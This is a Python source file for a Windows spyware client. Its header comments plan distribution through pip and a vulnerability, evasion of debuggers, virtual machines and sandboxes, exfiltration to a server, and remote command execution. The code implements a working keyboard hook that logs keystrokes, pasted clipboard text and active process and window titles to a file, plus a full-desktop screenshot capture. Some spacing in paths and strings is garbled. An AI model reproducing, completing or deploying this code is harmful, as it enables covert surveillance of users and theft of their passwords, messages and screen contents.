#The Client should be able to be installed via pip install client and an vulnerability in it
#Afterwards the client should be able to detect if Debuggers are present and if so, it should exit or run diffrent functionalitys
#It should also detect if it is run in a Virtual machine or a Sandbox and if so, it should exit or run diffrent functionalitys
#If nothing of that is detected, it should run the normal functionality, which is Keylogging taking pictures of every new Window and send that
#to the Server (in an adequate format). The Server should also be able to execute commands on the Client and get the output of that command


#Imports
import os
import socket
from ctypes import *
import pythoncom
import pyHooked
import pyWinhook
import win32clipboard
import win32gui
import win32ui
import win32con
import win32api

#The Keylogger function
def keylogger():
    pass





user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
current_hwnd = 0

def KeyStroke ( event ) :
    global current_window
    # check to see if target changed windows
    if event.WindowName != current_window :
        current_window = event.WindowName
        get_current_process ()
    # if they pressed a standard key
    if 32 < event.Ascii < 127:
        c = chr ( event.Ascii )
        print ( c )
        WriteToFile ( c )
    else :
    # if [ Ctrl - V ] , get the value on the clipboard
        if event . Key == "V":
            win32clipboard.OpenClipboard ()
            pasted_value = win32clipboard.GetClipboardData ()
            win32clipboard.CloseClipboard ()
            p = "[ PASTE ] %s[ PASTE ] " % pasted_value
            print ( p )
            WriteToFile ( p )
        else :
            k = "[%s]" % event.Key
            print ( k )
            WriteToFile ( k )
    # pass execution to next hook registered
    return True



def WriteToFile ( s ) :
    # Modus a + fuers updaten der datei
    file = open ('./ test .txt ', 'a+') 
    file.write ( s )
    file.close ()



def get_current_process () :
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow ()
    # find the process ID
    pid = c_ulong (0)
    user32.GetWindowThreadProcessId ( hwnd , byref ( pid ) )
    # store the current process ID
    process_id = "\%d" % pid.value
    # grab the executable
    executable = create_string_buffer ( b"\ x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10 , False , pid )
    psapi.GetModuleBaseNameA ( h_process , None , byref (executable ) , 512)
    # now read its title
    window_title = create_string_buffer ( b"\x00" * 512)
    length = user32.GetWindowTextA ( hwnd ,
    byref( window_title ) , 512)
    # print out the header if we 're in the right process
    processinfo = "\n[ PID: \%s - \%s - \%s ]" % ( process_id ,executable.value , window_title.value ) +"\n"
    print ( processinfo )
    WriteToFile ( processinfo )
    # close handles
    kernel32.CloseHandle ( hwnd )
    kernel32.CloseHandle ( h_process )
    # create and register a hook manager
    kl = pyWinhook.HookManager ()
    kl . KeyDown = KeyStroke
    # register the hook and execute forever
    kl . HookKeyboard ()
    pythoncom.PumpMessages ()


def SaveScreenshot ( filename ) :
    # grab a handle to the main desktop window
    hdesktop = win32gui.GetDesktopWindow ()
    # determine the size of all monitors in pixels
    width = win32api.GetSystemMetrics ( win32con.SM_CXVIRTUALSCREEN )
    height = win32api.GetSystemMetrics ( win32con.SM_CYVIRTUALSCREEN )
    left = win32api.GetSystemMetrics ( win32con.SM_XVIRTUALSCREEN )
    top = win32api.GetSystemMetrics ( win32con.SM_YVIRTUALSCREEN )
    # create a device context
    desktop_dc = win32gui.GetWindowDC ( hdesktop )
    img_dc = win32ui.CreateDCFromHandle ( desktop_dc )
    # create a memory based device context
    mem_dc = img_dc.CreateCompatibleDC ()
    # create a bitmap object
    screenshot = win32ui.CreateBitmap ()
    screenshot.CreateCompatibleBitmap ( img_dc , width , height )
    mem_dc.SelectObject ( screenshot )
    # copy the screen into our memory device context
    mem_dc.BitBlt ((0 , 0) , ( width , height ) , img_dc ,( left , top ) , win32con . SRCCOPY )
    # save the bitmap to a file
    if not os.path.exists (" screenshots ") :
        os.makedirs (" screenshots ")
    screenshot.SaveBitmapFile ( mem_dc , "./ screenshots /" + filename )
    # free our objects
    mem_dc.DeleteDC ()
    win32gui.DeleteObject ( screenshot.GetHandle () )
    SaveScreenshot(" test .png")